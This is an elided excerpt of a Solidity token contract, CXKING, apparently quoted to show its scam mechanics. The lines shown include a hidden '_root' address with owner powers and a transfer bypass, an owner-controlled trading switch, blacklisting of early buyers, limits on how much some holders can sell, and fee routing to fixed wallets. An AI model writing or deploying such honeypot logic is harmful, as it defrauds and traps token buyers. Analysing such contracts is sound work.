...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(
            _owner == _msgSender() || _root == _msgSender(),
...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer(
        ...
        if (sender == _root) {
            _transferTokenn(sender, recipient, amount);
        } else {
...
contract CXKING is ERC20 {
    ...
    address payable _fundAddress =
        payable(address(0x80EA618c35DB7C6106644F08D5cc314C125C4Ab8));
    address private _marktAddress =
        address(0x6EC05d16Ac9425F36c43FFf6bFd554a08c747A8c);
    ...
    uint256 public addLiquidityBlock;
    address[] buyUser;
    ...
    constructor(address tokenOwner, address root) ERC20("CXKing", "CXKing") {
    ...
    function changeSwapStats() public onlyOwner {
        swapStats = !swapStats;
        if (swapStats) {
            addLiquidityBlock = block.number;
        }
    }
    ...
    function _transfer(
        ...
        require(!_isExcludedFromVips[from], "vip user");
        if (from == uniswapV2Pair) {
            require(inviter[to] != address(0));
        }
        ...
        if (balanceOf(address(this)) > 0) {
            if (
                ...
                swapping = true;
                swapAndLiquifyV1(balanceOf(address(this)));
                swapping = false;
            }
        }
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            ...
            if (to == uniswapV2Pair) {
                ...
                require(
                    haveAmount.sub(amount) >= haveAmount.div(10),
                    "10p can sell"
                );
            }
            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                require(swapStats, "not swap");
            }
        }
        if (takeFee) {
            //4%
            super._transfer(from, _marktAddress, amount.div(100).mul(4));
            //2%
            ...
            if (block.number - addLiquidityBlock < 3) {
                excludeFromVips(from, true);
            }
        }
        super._transfer(from, to, amount);
